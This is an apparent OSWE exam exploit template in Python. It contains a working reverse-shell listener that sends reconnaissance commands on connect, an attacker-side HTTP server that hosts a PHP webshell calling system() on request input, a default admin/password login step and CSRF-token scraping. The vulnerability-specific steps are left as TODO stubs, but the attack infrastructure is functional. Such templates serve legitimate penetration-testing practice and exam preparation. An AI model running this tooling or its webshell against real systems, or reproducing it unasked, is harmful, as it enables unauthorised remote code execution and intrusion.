#!/usr/bin/env python3
"""
OSWE Lightweight PoC Skeleton - Single File Template

A lightweight, standalone exploit template for quick/simple OSWE exploits.
All functionality is inline (no external modules required), making it easy
to copy-paste and adapt for single-vulnerability exploits.

Features:
- Simple step-based architecture (step1, step2, etc.)
- Built-in liveness check
- Built-in payload server (inline HTTP server)
- Built-in interactive listener (reverse shell capture)
- Professional CLI with argument groups
- Global state tracking (cookies, tokens, extracted data)

Usage:
    python3 poc_simple.py --target-ip 192.168.1.100 --lhost 10.10.14.5 --lport 4444
    python3 poc_simple.py --target-ip 192.168.1.100 --proxy http://127.0.0.1:8080
"""

import argparse
import requests
import sys
import time
import socket
import select
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Optional, Dict, Any
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# GLOBAL STATE
# ============================================================================

# Global session for persistent HTTP connections
session = requests.Session()

# Global configuration (set by parse_args)
target_url: str = ""
proxy: Optional[str] = None
attacker_ip: str = ""
attacker_port: int = 0
payload_port: int = 0

# Exploit state tracking
global_state: Dict[str, Any] = {
    'session_cookie': None,
    'csrf_token': None,
    'extracted_data': {},
    'shell_url': None,
}

# ============================================================================
# ARGUMENT PARSING
# ============================================================================

def parse_args() -> argparse.Namespace:
    """Parse command-line arguments with organized groups."""
    parser = argparse.ArgumentParser(
        description="OSWE Lightweight PoC Skeleton",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic exploitation
  %(prog)s --target-ip 192.168.1.100 --lhost 10.10.14.5 --lport 4444

  # With Burp proxy
  %(prog)s --target-ip 192.168.1.100 --proxy http://127.0.0.1:8080

  # Custom payload port
  %(prog)s --target-ip 192.168.1.100 --lhost 10.10.14.5 --payload-port 8000
        """
    )

    # Target options
    target_group = parser.add_argument_group("Target options")
    target_group.add_argument(
        "--target-ip", required=True, help="Target server IP address"
    )
    target_group.add_argument(
        "--target-port", type=int, default=80, help="Target web port (default: 80)"
    )
    target_group.add_argument(
        "--protocol", default="http", choices=["http", "https"],
        help="Protocol (default: http)"
    )

    # Attacker options
    attacker_group = parser.add_argument_group("Attacker options")
    attacker_group.add_argument(
        "--lhost", required=True, help="Local IP for reverse shell"
    )
    attacker_group.add_argument(
        "--lport", type=int, default=4444, help="Local port for reverse shell (default: 4444)"
    )
    attacker_group.add_argument(
        "--payload-port", type=int, default=8000, help="Port for payload server (default: 8000)"
    )

    # Exploit options
    exploit_group = parser.add_argument_group("Exploit options")
    exploit_group.add_argument(
        "--delay", type=int, default=3, help="Delay for timing attacks (default: 3)"
    )
    exploit_group.add_argument(
        "--timeout", type=int, default=10, help="Request timeout (default: 10)"
    )

    # Optional options
    optional_group = parser.add_argument_group("Optional options")
    optional_group.add_argument(
        "--proxy", help="HTTP proxy for debugging (e.g., http://127.0.0.1:8080)"
    )
    optional_group.add_argument(
        "--verbose", "-v", action="store_true", help="Enable verbose output"
    )

    return parser.parse_args()


# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def log_info(msg: str) -> None:
    """Print info message."""
    print(f"[*] {msg}")


def log_success(msg: str) -> None:
    """Print success message."""
    print(f"[+] {msg}")


def log_error(msg: str) -> None:
    """Print error message."""
    print(f"[-] {msg}")


def log_warning(msg: str) -> None:
    """Print warning message."""
    print(f"[!] {msg}")


def log_step(step_num: int, msg: str) -> None:
    """Print step header."""
    print(f"\n{'='*60}")
    print(f"Step {step_num}: {msg}")
    print(f"{'='*60}")


def get_proxies() -> Optional[dict]:
    """Return proxy configuration if set."""
    if proxy:
        return {"http": proxy, "https": proxy}
    return None


def liveness_check() -> bool:
    """Verify target is reachable before starting exploitation."""
    log_info(f"Checking if target is reachable: {target_url}")
    
    try:
        response = session.get(
            f"{target_url}/",
            timeout=10,
            verify=False,
            proxies=get_proxies()
        )
        
        if response.status_code == 200:
            log_success("Target is reachable")
            return True
        else:
            log_warning(f"Target returned HTTP {response.status_code}")
            return True
            
    except requests.exceptions.RequestException as e:
        log_error(f"Liveness check failed: {e}")
        return False


# ============================================================================
# PAYLOAD SERVER (Inline Implementation)
# ============================================================================

class PayloadHandler(BaseHTTPRequestHandler):
    """HTTP request handler for serving payloads."""
    
    payloads: Dict[str, tuple] = {}  # path -> (content, content_type)
    callbacks: Dict[str, Any] = {}   # path -> callback function
    
    def do_GET(self):
        """Handle GET requests."""
        # Check for payload
        if self.path in self.payloads:
            content, content_type = self.payloads[self.path]
            self.send_response(200)
            self.send_header("Content-Type", content_type)
            self.end_headers()
            self.wfile.write(content.encode() if isinstance(content, str) else content)
            log_success(f"Served payload: {self.path}")
            return
        
        # Check for callback
        if self.path in self.callbacks:
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK")
            
            # Extract request data for callback
            client = self.client_address[0]
            self.callbacks[self.path]({"client": client, "path": self.path})
            return
        
        self.send_response(404)
        self.end_headers()
    
    def log_message(self, format, *args):
        """Suppress default HTTP logging."""
        if "--verbose" in sys.argv or "-v" in sys.argv:
            super().log_message(format, *args)


class PayloadServer:
    """Simple HTTP server for hosting payloads."""
    
    def __init__(self, port: int):
        self.port = port
        self.server: Optional[HTTPServer] = None
        self.thread: Optional[threading.Thread] = None
        self.payloads: Dict[str, tuple] = {}
    
    def add_payload(self, path: str, content: str, content_type: str = "text/plain") -> None:
        """Add a payload to serve."""
        self.payloads[path] = (content, content_type)
        PayloadHandler.payloads[path] = (content, content_type)
    
    def add_callback(self, path: str, callback) -> None:
        """Add a callback handler."""
        PayloadHandler.callbacks[path] = callback
    
    def start(self) -> bool:
        """Start the payload server."""
        try:
            self.server = HTTPServer(("0.0.0.0", self.port), PayloadHandler)
            self.thread = threading.Thread(target=self.server.serve_forever)
            self.thread.daemon = True
            self.thread.start()
            log_success(f"Payload server started on port {self.port}")
            return True
        except Exception as e:
            log_error(f"Failed to start payload server: {e}")
            return False
    
    def stop(self) -> None:
        """Stop the payload server."""
        if self.server:
            self.server.shutdown()
            log_info("Payload server stopped")
    
    def get_url(self, path: str) -> str:
        """Get full URL for a payload."""
        return f"http://{attacker_ip}:{self.port}{path}"


# ============================================================================
# INTERACTIVE LISTENER (Inline Implementation)
# ============================================================================

class InteractiveListener:
    """Interactive reverse shell listener using select()."""
    
    def __init__(self, port: int):
        self.port = port
        self.socket: Optional[socket.socket] = None
        self.connection: Optional[socket.socket] = None
        self.client_address: Optional[tuple] = None
        self.listening = False
        self.connected = False
        self.thread: Optional[threading.Thread] = None
        self.stop_event = threading.Event()
    
    def start(self) -> bool:
        """Start listening for connections."""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind(("0.0.0.0", self.port))
            self.socket.listen(1)
            self.listening = True
            
            log_info(f"Listener started on port {self.port}")
            
            self.thread = threading.Thread(target=self._accept)
            self.thread.daemon = True
            self.thread.start()
            return True
            
        except Exception as e:
            log_error(f"Failed to start listener: {e}")
            return False
    
    def _accept(self) -> None:
        """Accept incoming connections."""
        try:
            self.socket.settimeout(1.0)
            while not self.stop_event.is_set():
                try:
                    self.connection, self.client_address = self.socket.accept()
                    self.connected = True
                    print(f"\n[+] Connection from {self.client_address[0]}:{self.client_address[1]}")
                    self._print_banner()
                    break
                except socket.timeout:
                    continue
        except Exception as e:
            if not self.stop_event.is_set():
                log_error(f"Accept error: {e}")
    
    def _print_banner(self) -> None:
        """Print professional banner."""
        print("="*50)
        print(f"  Shell established from {self.client_address[0]}")
        print("="*50)
        print()
        
        # Send initial commands
        if self.connection:
            self.connection.sendall(b"whoami; hostname; id; pwd\n")
    
    def interactive_shell(self) -> None:
        """Start interactive shell session."""
        if not self.connected:
            log_error("No active connection")
            return
        
        log_info("Entering interactive shell (Ctrl+C to exit)\n")
        
        try:
            while self.connected:
                readable, _, _ = select.select([self.connection, sys.stdin], [], [], 0.1)
                
                for source in readable:
                    if source is self.connection:
                        data = self.connection.recv(4096)
                        if not data:
                            print("\n[-] Connection closed")
                            self.connected = False
                            break
                        sys.stdout.write(data.decode(errors="ignore"))
                        sys.stdout.flush()
                    
                    elif source is sys.stdin:
                        cmd = sys.stdin.readline()
                        if self.connection:
                            self.connection.sendall(cmd.encode())
        
        except KeyboardInterrupt:
            print("\n[!] Interrupted")
        except Exception as e:
            log_error(f"Shell error: {e}")
        finally:
            self.connected = False
    
    def wait_for_connection(self, timeout: int = 60) -> bool:
        """Wait for a connection with timeout."""
        start = time.time()
        while not self.connected:
            if time.time() - start > timeout:
                log_error(f"Timeout waiting for connection ({timeout}s)")
                return False
            time.sleep(0.1)
        return True
    
    def stop(self) -> None:
        """Stop the listener."""
        self.stop_event.set()
        if self.connection:
            self.connection.close()
        if self.socket:
            self.socket.close()
        self.listening = False
        self.connected = False


# ============================================================================
# EXPLOIT STEPS (Customize these for your vulnerability)
# ============================================================================

def step1_authentication() -> bool:
    """
    Step 1: Authentication or initial access.
    
    Implement your authentication bypass, login, or initial access here.
    Store session cookies/tokens in global_state for later steps.
    """
    log_step(1, "Authentication")
    
    # Example: Login to application
    login_url = f"{target_url}/login"
    credentials = {
        "username": "admin",
        "password": "password"
    }
    
    try:
        log_info(f"Attempting login to {login_url}")
        response = session.post(
            login_url,
            data=credentials,
            verify=False,
            proxies=get_proxies(),
            timeout=10
        )
        
        # Store session cookie
        if "session" in session.cookies:
            global_state['session_cookie'] = session.cookies.get("session")
            log_success("Authenticated successfully")
            log_info(f"Session: {global_state['session_cookie'][:20]}...")
            return True
        else:
            log_error("Authentication failed")
            return False
            
    except Exception as e:
        log_error(f"Authentication error: {e}")
        return False


def step2_extract_data() -> bool:
    """
    Step 2: Extract useful data (tokens, IDs, etc.).
    
    Use data from step1 to extract additional information needed
    for exploitation. Store in global_state['extracted_data'].
    """
    log_step(2, "Data Extraction")
    
    # Example: Extract CSRF token from a page
    try:
        log_info("Extracting CSRF token...")
        response = session.get(
            f"{target_url}/profile",
            verify=False,
            proxies=get_proxies(),
            timeout=10
        )
        
        # Parse token (customize for your target)
        import re
        match = re.search(r'name="csrf_token" value="([^"]+)"', response.text)
        if match:
            global_state['csrf_token'] = match.group(1)
            global_state['extracted_data']['csrf_token'] = match.group(1)
            log_success(f"CSRF token extracted: {match.group(1)[:20]}...")
            return True
        else:
            log_warning("CSRF token not found")
            return True  # Continue anyway
            
    except Exception as e:
        log_error(f"Extraction error: {e}")
        return False


def step3_exploitation(server: PayloadServer) -> bool:
    """
    Step 3: Main exploitation.
    
    Implement your vulnerability exploitation here.
    Use global_state data from previous steps.
    Use the payload server to host exploits/callbacks.
    """
    log_step(3, "Exploitation")
    
    # Example: Add a webshell to payload server
    php_shell = """<?php system($_REQUEST['cmd']); ?>"""
    server.add_payload("/shell.php", php_shell, "application/x-php")
    log_info(f"Webshell available at: {server.get_url('/shell.php')}")
    
    # Example: Add callback handler
    def on_callback(data):
        log_success(f"Callback received from {data['client']}")
    
    server.add_callback("/callback", on_callback)
    log_info(f"Callback URL: {server.get_url('/callback')}")
    
    # TODO: Implement your exploit here
    # Use global_state['csrf_token'] if needed
    # Use global_state['session_cookie'] for authenticated requests
    
    log_warning("Exploitation step not fully implemented - customize for your target")
    return True


def step4_reverse_shell(listener: InteractiveListener) -> bool:
    """
    Step 4: Trigger and capture reverse shell.
    
    Trigger the reverse shell on target and interact with it.
    """
    log_step(4, "Reverse Shell")
    
    log_info("Waiting for reverse shell connection...")
    log_info(f"Listener on port {attacker_port}")
    
    # TODO: Trigger reverse shell on target here
    # Example: Use webshell to trigger callback to attacker
    
    # Wait for connection
    if listener.wait_for_connection(timeout=60):
        log_success("Reverse shell connected!")
        listener.interactive_shell()
        return True
    else:
        log_error("No connection received")
        return False


# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    """Main exploit execution."""
    global target_url, proxy, attacker_ip, attacker_port, payload_port
    
    # Parse arguments
    args = parse_args()
    
    # Set global configuration
    target_url = f"{args.protocol}://{args.target_ip}:{args.target_port}"
    proxy = args.proxy
    attacker_ip = args.lhost
    attacker_port = args.lport
    payload_port = args.payload_port
    
    # Print banner
    print(f"""
{'='*60}
OSWE Lightweight PoC Skeleton
{'='*60}
Target:     {target_url}
LHOST:      {attacker_ip}
LPORT:      {attacker_port}
Payload:    {payload_port}
{'='*60}
""")
    
    # Liveness check
    if not liveness_check():
        log_error("Target is not reachable. Aborting.")
        sys.exit(1)
    
    # Initialize payload server
    server = PayloadServer(port=payload_port)
    if not server.start():
        log_error("Failed to start payload server")
        sys.exit(1)
    
    # Initialize listener
    listener = InteractiveListener(port=attacker_port)
    if not listener.start():
        log_error("Failed to start listener")
        server.stop()
        sys.exit(1)
    
    try:
        # Execute exploit steps
        success = True
        
        if success:
            success = step1_authentication()
        
        if success:
            success = step2_extract_data()
        
        if success:
            success = step3_exploitation(server)
        
        if success:
            success = step4_reverse_shell(listener)
        
        # Summary
        print(f"\n{'='*60}")
        if success:
            log_success("Exploitation completed successfully")
        else:
            log_error("Exploitation failed")
        print(f"{'='*60}")
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    finally:
        # Cleanup
        server.stop()
        listener.stop()


if __name__ == "__main__":
    main()
